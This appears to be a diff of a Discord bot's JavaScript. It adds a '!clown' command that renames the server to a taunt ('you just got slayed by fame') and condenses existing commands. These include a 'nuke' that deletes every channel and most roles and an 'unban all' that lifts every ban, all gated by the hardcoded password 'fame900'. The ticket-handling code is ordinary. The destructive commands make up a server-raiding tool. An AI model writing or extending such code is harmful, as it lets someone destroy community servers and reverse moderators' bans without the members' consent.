@@ -63,7 +63,7 @@ const client = new Client({
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.GuildMembers,
     GatewayIntentBits.MessageContent,
-    GatewayIntentBits.GuildBans   // Added for unbanning
+    GatewayIntentBits.GuildBans
   ]
 });
 
@@ -175,7 +175,7 @@ client.on('messageCreate', async message => {
     const embed = new EmbedBuilder()
       .setColor('#00ff00')
       .setTitle('🔓 UNBAN ALL CONFIRMATION')
-      .setDescription('This will unban **everyone** who is currently banned from the server.\n\nOnly you can proceed.')
+      .setDescription('This will unban **everyone** who is currently banned.\n\nOnly you can proceed.')
       .setFooter({ text: 'Click the button below' })
       .setTimestamp();
 
@@ -184,6 +184,26 @@ client.on('messageCreate', async message => {
         .setCustomId(`unban_start_${message.author.id}`)
         .setLabel('Enter Password')
         .setStyle(ButtonStyle.Success)
+    );
+
+    await message.reply({ embeds: [embed], components: [row] });
+    return;
+  }
+
+  // !clown - Change Server Name
+  if (content === '!clown') {
+    const embed = new EmbedBuilder()
+      .setColor('#ffff00')
+      .setTitle('🤡 CLOWN COMMAND')
+      .setDescription('This will change the **server name** to:\n**you just got slayed by fame**\n\nOnly you can proceed.')
+      .setFooter({ text: 'Click the button below' })
+      .setTimestamp();
+
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId(`clown_start_${message.author.id}`)
+        .setLabel('Enter Password')
+        .setStyle(ButtonStyle.Primary)
     );
 
     await message.reply({ embeds: [embed], components: [row] });
@@ -198,24 +218,16 @@ client.on('interactionCreate', async interaction => {
   // === NUKE BUTTON + MODAL ===
   if (interaction.isButton() && interaction.customId.startsWith('nuke_start_')) {
     const userId = interaction.customId.split('_')[2];
-    if (interaction.user.id !== userId) {
-      return interaction.reply({ content: '❌ This button is not for you.', ephemeral: true });
-    }
+    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This button is not for you.', ephemeral: true });
 
-    const modal = new ModalBuilder()
-      .setCustomId(`nuke_modal_${userId}`)
-      .setTitle('Enter Nuke Password');
-
+    const modal = new ModalBuilder().setCustomId(`nuke_modal_${userId}`).setTitle('Enter Nuke Password');
     const passwordInput = new TextInputBuilder()
       .setCustomId('nuke_password')
       .setLabel('Password')
       .setStyle(TextInputStyle.Short)
-      .setPlaceholder('Enter password')
       .setRequired(true);
 
-    const row = new ActionRowBuilder().addComponents(passwordInput);
-    modal.addComponents(row);
-
+    modal.addComponents(new ActionRowBuilder().addComponents(passwordInput));
     await interaction.showModal(modal);
   }
 
@@ -223,55 +235,41 @@ client.on('interactionCreate', async interaction => {
     const userId = interaction.customId.split('_')[2];
     if (interaction.user.id !== userId) return;
 
-    const password = interaction.fields.getTextInputValue('nuke_password');
-    if (password !== 'fame900') {
+    if (interaction.fields.getTextInputValue('nuke_password') !== 'fame900') {
       return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
     }
 
-    await interaction.reply({ content: '🔴 **NUKE INITIATED** - Deleting everything...', ephemeral: true });
-
+    await interaction.reply({ content: '🔴 **NUKE INITIATED**...', ephemeral: true });
     const guild = interaction.guild;
+
     try {
       const channels = Array.from(guild.channels.cache.values());
-      for (const channel of channels) {
-        await channel.delete().catch(() => {});
-      }
-
+      for (const ch of channels) await ch.delete().catch(() => {});
       const roles = Array.from(guild.roles.cache.values());
       for (const role of roles) {
         if (role.name === 'Owner' || role.name === '@everyone') continue;
         await role.delete().catch(() => {});
       }
-
-      await interaction.followUp({ content: '✅ **Server has been nuked successfully.**', ephemeral: true });
+      await interaction.followUp({ content: '✅ **Server nuked successfully.**', ephemeral: true });
     } catch (err) {
       console.error(err);
       await interaction.followUp({ content: '⚠️ Nuke partially failed.', ephemeral: true });
     }
-    return;
   }
 
   // === UNBAN ALL BUTTON + MODAL ===
   if (interaction.isButton() && interaction.customId.startsWith('unban_start_')) {
     const userId = interaction.customId.split('_')[2];
-    if (interaction.user.id !== userId) {
-      return interaction.reply({ content: '❌ This button is not for you.', ephemeral: true });
-    }
+    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This button is not for you.', ephemeral: true });
 
-    const modal = new ModalBuilder()
-      .setCustomId(`unban_modal_${userId}`)
-      .setTitle('Enter Unban Password');
-
+    const modal = new ModalBuilder().setCustomId(`unban_modal_${userId}`).setTitle('Enter Unban Password');
     const passwordInput = new TextInputBuilder()
       .setCustomId('unban_password')
       .setLabel('Password')
       .setStyle(TextInputStyle.Short)
-      .setPlaceholder('Enter password')
       .setRequired(true);
 
-    const row = new ActionRowBuilder().addComponents(passwordInput);
-    modal.addComponents(row);
-
+    modal.addComponents(new ActionRowBuilder().addComponents(passwordInput));
     await interaction.showModal(modal);
   }
 
@@ -279,36 +277,59 @@ client.on('interactionCreate', async interaction => {
     const userId = interaction.customId.split('_')[2];
     if (interaction.user.id !== userId) return;
 
-    const password = interaction.fields.getTextInputValue('unban_password');
-    if (password !== 'fame900') {
+    if (interaction.fields.getTextInputValue('unban_password') !== 'fame900') {
       return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
     }
 
-    await interaction.reply({ content: '🔓 **UNBANNING EVERYONE** - This may take a while...', ephemeral: true });
-
+    await interaction.reply({ content: '🔓 **Unbanning everyone...**', ephemeral: true });
     const guild = interaction.guild;
-    let unbannedCount = 0;
+    let count = 0;
 
     try {
       const bans = await guild.bans.fetch();
-      if (bans.size === 0) {
-        return interaction.followUp({ content: '✅ No banned users found.', ephemeral: true });
-      }
-
       for (const ban of bans.values()) {
-        await guild.members.unban(ban.user.id, 'Unban All Command').catch(() => {});
-        unbannedCount++;
+        await guild.members.unban(ban.user.id).catch(() => {});
+        count++;
       }
-
-      await interaction.followUp({ 
-        content: `✅ **Successfully unbanned ${unbannedCount} users.**`, 
-        ephemeral: true 
-      });
+      await interaction.followUp({ content: `✅ Successfully unbanned **${count}** users.`, ephemeral: true });
     } catch (err) {
       console.error(err);
-      await interaction.followUp({ content: '⚠️ Unban process partially failed.', ephemeral: true });
+      await interaction.followUp({ content: '⚠️ Unban partially failed.', ephemeral: true });
     }
-    return;
+  }
+
+  // === CLOWN BUTTON + MODAL ===
+  if (interaction.isButton() && interaction.customId.startsWith('clown_start_')) {
+    const userId = interaction.customId.split('_')[2];
+    if (interaction.user.id !== userId) return interaction.reply({ content: '❌ This button is not for you.', ephemeral: true });
+
+    const modal = new ModalBuilder().setCustomId(`clown_modal_${userId}`).setTitle('Enter Clown Password');
+    const passwordInput = new TextInputBuilder()
+      .setCustomId('clown_password')
+      .setLabel('Password')
+      .setStyle(TextInputStyle.Short)
+      .setRequired(true);
+
+    modal.addComponents(new ActionRowBuilder().addComponents(passwordInput));
+    await interaction.showModal(modal);
+  }
+
+  if (interaction.isModalSubmit() && interaction.customId.startsWith('clown_modal_')) {
+    const userId = interaction.customId.split('_')[2];
+    if (interaction.user.id !== userId) return;
+
+    if (interaction.fields.getTextInputValue('clown_password') !== 'fame900') {
+      return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
+    }
+
+    const guild = interaction.guild;
+    try {
+      await guild.setName('you just got slayed by fame');
+      await interaction.reply({ content: '🤡 **Server name changed successfully!**', ephemeral: true });
+    } catch (err) {
+      console.error(err);
+      await interaction.reply({ content: '❌ Failed to change server name. (Missing permissions?)', ephemeral: true });
+    }
   }
 
   // === SETTICKET ===
@@ -417,17 +438,13 @@ client.on('interactionCreate', async interaction => {
   if (interaction.isButton()) {
     if (interaction.customId === 'close_ticket') {
       const isOwner = interaction.user.id === interaction.channel.topic;
-      if (!isOwner && !isStaff(interaction.member)) {
-        return interaction.reply({ content: 'Only owner or staff can close.', ephemeral: true });
-      }
+      if (!isOwner && !isStaff(interaction.member)) return interaction.reply({ content: 'Only owner or staff can close.', ephemeral: true });
       await interaction.reply({ embeds: [new EmbedBuilder().setColor('#ff0000').setDescription('Ticket closing in 5 seconds.')] });
       setTimeout(() => interaction.channel.delete().catch(() => {}), 5000);
     }
 
     if (interaction.customId === 'claim_ticket') {
-      if (!isStaff(interaction.member)) {
-        return interaction.reply({ content: 'Only staff can claim.', ephemeral: true });
-      }
+      if (!isStaff(interaction.member)) return interaction.reply({ content: 'Only staff can claim.', ephemeral: true });
       await interaction.reply({ embeds: [new EmbedBuilder().setColor('#00ff00').setDescription(`${interaction.user} claimed this ticket.`)] });
     }
   }
